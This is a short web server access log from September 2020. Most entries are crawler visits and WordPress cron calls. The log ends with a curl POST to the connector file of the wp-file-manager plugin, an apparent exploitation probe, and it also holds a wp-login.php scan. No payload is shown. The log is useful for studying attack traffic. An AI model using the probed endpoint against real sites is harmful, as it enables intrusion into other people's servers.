185.86.164.110 - - [18/Sep/2020:19:28:56 +0100] "GET /wp-login.php HTTP/1.1" 404 18998 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.191.171.21 - - [18/Sep/2020:19:29:40 +0100] "GET /dane/dane/prz6/maleszowa/maleszowa.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
194.146.24.53 - - [18/Sep/2020:19:32:50 +0100] "POST /wp-cron.php?doing_wp_cron=1600453970.5659940242767333984375 HTTP/1.1" 200 31 "http://ipmad.mztel.net/wp-cron.php?doing_wp_cron=1600453970.5659940242767333984375" "WordPress/5.5.1; https://ipmad.mztel.net"
66.249.75.238 - - [18/Sep/2020:19:32:50 +0100] "GET / HTTP/1.1" 301 5 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
185.191.171.23 - - [18/Sep/2020:19:35:45 +0100] "GET /dane/dane/prz2/dalej/pp25/foto/04.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
185.191.171.11 - - [18/Sep/2020:19:53:21 +0100] "GET /robots.txt HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
185.191.171.35 - - [18/Sep/2020:19:53:21 +0100] "GET /dane/dane/prz6/kamienne/fotki/kam10.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
114.119.128.89 - - [18/Sep/2020:19:54:22 +0100] "GET /dane/dane/prz2/pp15/foto/foto7.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)"
185.191.171.9 - - [18/Sep/2020:19:56:20 +0100] "GET /dane/dane/prz2/dalej/pp26/foto/12.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
185.191.171.20 - - [18/Sep/2020:19:59:01 +0100] "GET /dane/dane/prz6/mlodzawy/foto/foto10.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
185.191.171.17 - - [18/Sep/2020:20:00:33 +0100] "GET /dane/dane/prz3/pp7/foto/foto05.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
194.146.24.53 - - [18/Sep/2020:20:02:46 +0100] "POST /wp-cron.php?doing_wp_cron=1600455766.4552841186523437500000 HTTP/1.1" 200 31 "http://ipmad.mztel.net/wp-cron.php?doing_wp_cron=1600455766.4552841186523437500000" "WordPress/5.5.1; https://ipmad.mztel.net"
18.232.53.104 - - [18/Sep/2020:20:02:46 +0100] "GET / HTTP/1.1" 301 5 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36"
185.191.171.35 - - [18/Sep/2020:20:07:24 +0100] "GET /dane/dane/prz6/wachock/foto/afoto13.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
114.119.157.96 - - [18/Sep/2020:20:07:54 +0100] "GET /dane/dane/prz3/pp1/pp1.htm HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)"
173.82.239.141 - - [18/Sep/2020:20:11:49 +0100] "GET / HTTP/1.1" 301 185 "-" "-"
31.177.49.31 - - [18/Sep/2020:20:12:33 +0100] "POST /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php HTTP/1.1" 301 210 "-" "curl/7.68.0"
